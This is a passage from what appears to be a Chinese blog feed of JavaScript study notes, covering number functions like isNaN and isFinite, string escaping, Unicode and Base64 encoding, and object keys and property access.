<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="literal">true</span>)  <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">true</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="literal">null</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">null</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;123.45#&#x27;</span>) <span class="comment">// 123.45</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;123.45#&#x27;</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>

<h5 id="2-5-3-isNaN"><a href="#2-5-3-isNaN" class="headerlink" title="2.5.3 isNaN()"></a>2.5.3 isNaN()</h5><p><code>isNaN</code>用来判断一个值是否为NaN</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">123</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>若果传入非数值，会被先转为数值，比如传入字符串的时候，字符串会被先转成<code>NaN</code>，所以最后返回true，<br>所以<code>isNaN</code>为<code>true</code>的值不一定是<code>NaN</code>还可能是一个字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="built_in">Number</span>(<span class="string">&#x27;Hello&#x27;</span>)) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>对于对象和数组<code>isNaN</code>也返回<code>true</code>，但是对于空数组和只有一个数值成员的数组<code>isNaN</code>返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="built_in">Number</span>(&#123;&#125;)) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">isNaN</span>([<span class="string">&#x27;xzy&#x27;</span>]) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="built_in">Number</span>([<span class="string">&#x27;xzy&#x27;</span>])) <span class="comment">// true</span></span><br><span class="line">=========================</span><br><span class="line"><span class="built_in">isNaN</span>([]) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isNaN</span>([<span class="number">123</span>]) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isNaN</span>([<span class="string">&#x27;123&#x27;</span>]) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码之所以返回<code>false</code>，原因是这些数组能被<code>Number</code>函数转成数值,<br>因此，使用<code>isNaN</code>之前，最好判断一下数据类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myIsNaN</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> value === <span class="string">&#x27;number&#x27;</span> &amp;&amp; <span class="built_in">isNaN</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断<code>NaN</code>更可靠的方法是，利用<code>NaN</code>为唯一不等于自身的值的这个特点，进行判断</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myIsNaN</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value !== value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-4-isFinite"><a href="#2-5-4-isFinite" class="headerlink" title="2.5.4 isFinite()"></a>2.5.4 isFinite()</h5><p><code>isFinite</code>方法返回一个布尔值，表示某个值是否为正常的数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isFinite</span>(<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isFinite</span>(-<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="literal">undefined</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="literal">null</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isFinite</span>(-<span class="number">1</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>除了<code>Infinity</code>、<code>-Infinity</code>、<code>NaN</code>和<code>undefined</code>这几个值会返回<code>false</code>，<code>isFinite</code>对于其他的数值都会返回<code>true</code></p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS数据类型-数值</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0002</title>
    <url>/2021/05/05/%E6%89%93%E5%8D%A10002/</url>
    <content><![CDATA[<p><font color=#daa520><strong>孟夏之日，万物并秀，愿你也如这热情初夏，昂扬向上，自强不息</strong></font></p>
<h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><h3 id="3-字符串"><a href="#3-字符串" class="headerlink" title="3. 字符串"></a>3. 字符串</h3><h5 id="3-1-1-定义"><a href="#3-1-1-定义" class="headerlink" title="3.1.1 定义"></a>3.1.1 定义</h5><p>字符串就是零个或多个排在一起的字符，放在单引号或双引号之中，单引号字符串的内部，可以使用<br>双引号。双引号字符串的内部，可以使用单引号，推荐HTML语言使用双引号，JS语言使用单引号</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;key = &quot;value&quot;&#x27;</span></span><br><span class="line"><span class="string">&quot;It&#x27;s a long journey&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果要在单引号字符串的内部，使用单引号，就必须在内部的单引号前面加上反斜杠，用来转义。双<br>引号字符串内部使用双引号，也是如此</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;Did she say \&#x27;Hello\&#x27;?&#x27;</span></span><br><span class="line"><span class="comment">// &quot;Did she say &#x27;Hello&#x27;?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;Did she say \&quot;Hello\&quot;?&quot;</span></span><br><span class="line"><span class="comment">// &quot;Did she say &quot;Hello&quot;?&quot;</span></span><br></pre></td></tr></table></figure>
<p>字符串默认只能写在一行内，如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠,<br>或者用<code>+</code>拼接多个单行字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longString = <span class="string">&#x27;Long \</span></span><br><span class="line"><span class="string">long \</span></span><br><span class="line"><span class="string">long \</span></span><br><span class="line"><span class="string">string&#x27;</span>;</span><br><span class="line"><span class="comment">// &quot;Long long long string&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> longString = <span class="string">&#x27;Long &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;long &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;long &#x27;</span></span><br><span class="line">  + <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="comment">// &quot;Long long long string&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果想输出多行字符串，有一种利用多行注释的变通方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">/*s</span></span><br><span class="line"><span class="comment">line 1</span></span><br><span class="line"><span class="comment">line 2</span></span><br><span class="line"><span class="comment">line 3</span></span><br><span class="line"><span class="comment">*/</span>&#125;).toString().split(<span class="string">&#x27;\n&#x27;</span>).slice(<span class="number">1</span>, -<span class="number">1</span>).join(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;line 1</span></span><br><span class="line"><span class="comment">// line 2</span></span><br><span class="line"><span class="comment">// line 3&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-1-2-转义"><a href="#3-1-2-转义" class="headerlink" title="3.1.2 转义"></a>3.1.2 转义</h5><ul>
<li><code>\0</code> ：null（<code>\u0000</code>）</li>
<li><code>\b</code> ：后退键（<code>\u0008</code>）</li>
<li><code>\f</code>：换页符（<code>\u000C</code>）</li>
<li><code>\n</code> ：换行符（<code>\u000A</code>）</li>
<li><code>\r</code> ：回车键（<code>\u000D</code>）</li>
<li><code>\t</code> ：制表符（<code>\u0009</code>）</li>
<li><code>\v</code> ：垂直制表符（<code>\u000B</code>）</li>
<li><code>\&#39;</code> ：单引号（<code>\u0027</code>）</li>
<li><code>\&quot;</code> ：双引号（<code>\u0022</code>）</li>
<li><code>\\</code> ：反斜杠（<code>\u005C</code>）</li>
</ul>
<p>反斜杠还有三种特殊的用法</p>
<ol>
<li><code>/HHH</code>: 反斜杠后面紧跟三个八进制数（000到377），代表一个字符</li>
<li><code>\xHH</code>: \x后面紧跟两个十六进制数（00到FF），代表一个字符</li>
<li><code>\uXXXX</code>:\u后面紧跟四个十六进制数（0000到FFFF），代表一个字符</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\251&#x27;</span> <span class="comment">// &quot;©&quot;</span></span><br><span class="line"><span class="string">&#x27;\xA9&#x27;</span> <span class="comment">// &quot;©&quot;</span></span><br><span class="line"><span class="string">&#x27;\u00A9&#x27;</span> <span class="comment">// &quot;©&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\172&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\x7A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u007A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果在非特殊字符前面使用反斜杠，则反斜杠会被省略</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\a&#x27;</span></span><br><span class="line"><span class="comment">// &quot;a&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-1-3-字符串与数组"><a href="#3-1-3-字符串与数组" class="headerlink" title="3.1.3 字符串与数组"></a>3.1.3 字符串与数组</h5><p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符,但不能<br>对字符串进行增删操作如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则<br>返回<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">s[<span class="number">0</span>] <span class="comment">// &quot;h&quot;</span></span><br><span class="line">s[<span class="number">1</span>] <span class="comment">// &quot;e&quot;</span></span><br><span class="line">s[<span class="number">4</span>] <span class="comment">// &quot;o&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接对字符串使用方括号运算符</span></span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>[<span class="number">1</span>] <span class="comment">// &quot;e&quot;</span></span><br><span class="line">---------------------------</span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>[<span class="number">3</span>] <span class="comment">// undefined</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>[-<span class="number">1</span>] <span class="comment">// undefined</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>[<span class="string">&#x27;x&#x27;</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<h5 id="3-1-4-length属性"><a href="#3-1-4-length属性" class="headerlink" title="3.1.4 length属性"></a>3.1.4 length属性</h5><p><code>length</code>属性返回字符串的长度，该属性也是无法改变的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">s.length = <span class="number">3</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">s.length = <span class="number">7</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-字符集"><a href="#3-2-字符集" class="headerlink" title="3.2 字符集"></a>3.2 字符集</h4><p>JavaScript 引擎内部，所有字符都用 Unicode 表示，JavaScript不仅以 Unicode 储存字符，还允许直接在程序中使用<code>Unicode</code>码点表示字符，即将字符写成\uxxxx的形式，其中xxxx代表该字符的 Unicode 码点。比如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;\u00A9&#x27;</span>;</span><br><span class="line">s <span class="comment">// &quot;©&quot;</span></span><br></pre></td></tr></table></figure>
<p>解析代码的时候，JavaScript 会自动识别一个字符是字面形式表示，还是Unicode形式表示。输出给用户的时候，所有字符都会转成字面形式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f\u006F\u006F = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">foo <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节,但是，UTF-16 有两种长度：对于码点在U+0000到U+FFFF之间的字符，长度为16位（即2个字节）；对于码点在U+10000到U+10FFFF之间的字符，长度为32位（即4个字节），而且前两个字节在0xD800到0xDBFF之间，后两个字节在0xDC00到0xDFFF之间。举例来说，码点U+1D306对应的字符为𝌆，它写成 UTF-16 就是0xD834 0xDF06。</p>
<p>JavaScript 对 UTF-16 的支持是不完整的，由于历史原因，只支持两字节的字符，不支持四字节的字符。这是因为 JavaScript 第一版发布的时候，Unicode 的码点只编到U+FFFF，因此两字节足够表示了。后来，Unicode 纳入的字符越来越多，出现了四字节的编码。但是，JavaScript 的标准此时已经定型了，统一将字符长度限制在两字节，导致无法识别四字节的字符。上一节的那个四字节字符𝌆，浏览器会正确识别这是一个字符，但是 JavaScript 无法识别，会认为这是两个字符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;𝌆&#x27;</span>.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>总结一下，<strong>对于码点在U+10000到U+10FFFF之间的字符，JavaScript 总是认为它们是两个字符（length属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的</strong>。</p>
<h4 id="3-3-base64转码"><a href="#3-3-base64转码" class="headerlink" title="3.3 base64转码"></a>3.3 base64转码</h4><p>有时，文本里面包含一些不可打印的符号，比如ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码</p>
<p>所谓 Base64 就是一种编码方法，可以将任意值转成 0～9、A～Z、a-z、+和/这64个字符组成的可打印字符。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理</p>
<p>JavaScript 原生提供两个 Base64 相关的方法</p>
<ul>
<li><code>btoa()</code>:任意值转为 Base64 编码</li>
<li><code>atob()</code>:Base64 编码转为原来的值<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> string = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line">btoa(string) <span class="comment">// &quot;SGVsbG8gV29ybGQh&quot;</span></span><br><span class="line">atob(<span class="string">&#x27;SGVsbG8gV29ybGQh&#x27;</span>) <span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>
这两个方法不适合非 ASCII 码的字符，会报错,要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btoa(<span class="string">&#x27;你好&#x27;</span>) <span class="comment">// 报错</span></span><br><span class="line">---------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b64Encode</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> btoa(<span class="built_in">encodeURIComponent</span>(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b64Decode</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(atob(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b64Encode(<span class="string">&#x27;你好&#x27;</span>) <span class="comment">// &quot;JUU0JUJEJUEwJUU1JUE1JUJE&quot;</span></span><br><span class="line">b64Decode(<span class="string">&#x27;JUU0JUJEJUEwJUU1JUE1JUJE&#x27;</span>) <span class="comment">// &quot;你好&quot;</span></span><br></pre></td></tr></table></figure>








]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS数据类型-字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0003</title>
    <url>/2021/05/05/%E6%89%93%E5%8D%A10003/</url>
    <content><![CDATA[<p><font color=skyblue><strong>愿我们都能接受生活最真实的日子，在经过了岁月的洗礼之后，仍能坚定地迈向自己向往的生活</strong></font></p>
<h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><h3 id="4-对象"><a href="#4-对象" class="headerlink" title="4.对象"></a>4.对象</h3><h5 id="4-1-1-生成方法"><a href="#4-1-1-生成方法" class="headerlink" title="4.1.1 生成方法"></a>4.1.1 生成方法</h5><p>什么是对象？简单说，对象就是一组“键值对”（key-value）的集合，是一种无序的复合数据集合</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  bar: <span class="string">&#x27;World&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，大括号就定义了一个对象，它被赋值给变量obj，所以变量obj就指向一个对象。该对象内部包含两个键值对（又称为两个“成员”），第一个键值对是foo: ‘Hello’，其中foo是“键名”（成员的名称），字符串Hello是“键值”（成员的值）。键名与键值之间用冒号分隔。第二个键值对是bar: ‘World’，bar是键名，World是键值。两个键值对之间用逗号分隔</p>
<h5 id="4-1-2-键名"><a href="#4-1-2-键名" class="headerlink" title="4.1.2 键名"></a>4.1.2 键名</h5><p>对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以，如果键名是数值，会被自动转为字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  <span class="number">3.2</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">  <span class="number">1e2</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="number">1e-2</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="number">.234</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="number">0xFF</span>: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj</span><br><span class="line"><span class="comment">// Object &#123;</span></span><br><span class="line"><span class="comment">//   1: &quot;a&quot;,</span></span><br><span class="line"><span class="comment">//   3.2: &quot;b&quot;,</span></span><br><span class="line"><span class="comment">//   100: true,</span></span><br><span class="line"><span class="comment">//   0.01: true,</span></span><br><span class="line"><span class="comment">//   0.234: true,</span></span><br><span class="line"><span class="comment">//   255: true</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">obj[<span class="string">&#x27;100&#x27;</span>] <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  1p: <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="string">&#x27;1p&#x27;</span>: <span class="string">&#x27;Hello World&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;h w&#x27;</span>: <span class="string">&#x27;Hello World&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;p+q&#x27;</span>: <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用，下面代码中，对象obj的属性p，就指向一个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.p(<span class="number">1</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>如果属性的值还是一个对象，就形成了链式引用，属性可以动态创建，不必在对象声明时就指定</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = &#123; <span class="attr">bar</span>: <span class="string">&#x27;hello&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">o1.foo = o2;</span><br><span class="line">o1.foo.bar <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象o1的属性foo指向对象o2，就可以链式引用o2的属性</p>
<h5 id="4-1-3-对象的引用"><a href="#4-1-3-对象的引用" class="headerlink" title="4.1.3 对象的引用"></a>4.1.3 对象的引用</h5><p>如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = o1;</span><br><span class="line"></span><br><span class="line">o1.a = <span class="number">1</span>;</span><br><span class="line">o2.a <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">o2.b = <span class="number">2</span>;</span><br><span class="line">o1.b <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量，下面代码中，o1和o2指向同一个对象，然后o1的值变为1，这时不会对o2产生影响，o2还是指向原来的那个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = o1;</span><br><span class="line"></span><br><span class="line">o1 = <span class="number">1</span>;</span><br><span class="line">o2 <span class="comment">// &#123;&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="4-1-4-表达式还是语句？"><a href="#4-1-4-表达式还是语句？" class="headerlink" title="4.1.4 表达式还是语句？"></a>4.1.4 表达式还是语句？</h5><p>对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;</span><br></pre></td></tr></table></figure>

<p>JavaScript 引擎读到上面这行代码，会发现可能有两种含义。第一种可能是，这是一个表达式，表示一个包含foo属性的对象；第二种可能是，这是一个语句，表示一个代码区块，里面有一个标签foo，指向表达式123。</p>
<p>为了避免这种歧义，JavaScript 引擎的做法是，如果遇到这种情况，无法确定是对象还是代码块，一律解释为代码块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="built_in">console</span>.log(<span class="number">123</span>) &#125; <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>

<p>如果要解释为对象，最好在大括号前加上圆括号。因为圆括号的里面，只能是表达式，所以确保大括号只能解释为对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(&#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;) <span class="comment">// 正确</span></span><br><span class="line">(&#123; <span class="built_in">console</span>.log(<span class="number">123</span>) &#125;) <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>这种差异在eval语句（作用是对字符串求值）中反映得最明显</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#123;foo: 123&#125;&#x27;</span>) <span class="comment">// 123</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;(&#123;foo: 123&#125;)&#x27;</span>) <span class="comment">// &#123;foo: 123&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果没有圆括号，eval将其理解为一个代码块；加上圆括号以后，就理解成一个对象</p>
<h4 id="4-2-属性的操作"><a href="#4-2-属性的操作" class="headerlink" title="4.2 属性的操作"></a>4.2 属性的操作</h4><h5 id="4-2-1-属性的读取"><a href="#4-2-1-属性的读取" class="headerlink" title="4.2.1 属性的读取"></a>4.2.1 属性的读取</h5><p>读取对象的属性，有两种方法，一种是使用点运算符，还有一种是使用方括号运算符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// &quot;Hello World&quot;</span></span><br><span class="line">obj[<span class="string">&#x27;p&#x27;</span>] <span class="comment">// &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="number">1</span>,</span><br><span class="line">  bar: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo  <span class="comment">// 1</span></span><br><span class="line">obj[foo]  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>方括号运算符内部还可以使用表达式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj[<span class="string">&#x27;hello&#x27;</span> + <span class="string">&#x27; world&#x27;</span>]</span><br><span class="line">obj[<span class="number">3</span> + <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<p>数字键可以不加引号，因为会自动转成字符串,数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="number">0.7</span>: <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj[<span class="string">&#x27;0.7&#x27;</span>] <span class="comment">// &quot;Hello World&quot;</span></span><br><span class="line">obj[<span class="number">0.7</span>] <span class="comment">// &quot;Hello World&quot;</span></span><br><span class="line">--------------------------</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="number">123</span>: <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj<span class="number">.123</span> <span class="comment">// 报错</span></span><br><span class="line">obj[<span class="number">123</span>] <span class="comment">// &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="4-2-2-属性的赋值"><a href="#4-2-2-属性的赋值" class="headerlink" title="4.2.2 属性的赋值"></a>4.2.2 属性的赋值</h5><p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值,JavaScript 允许属性的“后绑定”，也就是说，你可以在任意时刻新增属性，没必要在定义对象的时候，就定义好属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">obj[<span class="string">&#x27;bar&#x27;</span>] = <span class="string">&#x27;World&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="4-2-3-属性的查看"><a href="#4-2-3-属性的查看" class="headerlink" title="4.2.3 属性的查看"></a>4.2.3 属性的查看</h5><p>查看一个对象本身的所有属性，可以使用<code>Object.keys</code>方法</p>
